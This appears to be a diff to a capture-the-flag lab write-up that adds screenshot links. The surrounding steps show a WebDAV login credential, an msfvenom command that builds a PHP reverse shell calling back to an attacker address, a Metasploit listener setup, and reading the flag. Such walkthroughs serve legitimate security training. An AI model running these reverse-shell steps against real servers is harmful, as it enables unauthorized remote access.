@@ -77,6 +77,7 @@ Steps to set up:
     - ```ryan:linux4u```
 - Upload reverse php to webdav
   - ```msfvenom -p php/reverse_php LHOST=192.168.1.90 LPORT=4445 -f raw > exploit.php```
+    ![](Img/msfvenom1.png)
 - Create Listener
   - ```msf console```
     - ```use exploit multi/handler```
@@ -84,8 +85,10 @@ Steps to set up:
     - ``` set LPORT 4445```
     - ```set exploit php/reverse_php```
     - ```exploit```
+     ![](Img/msfvenom2.png)
 - Open exploit.php in web to run on remote server
 - Meterpreter session
   - ```cd /```
   - ```ls```
   - ```cat flag.txt```
+   ![](Img/flag.txt)
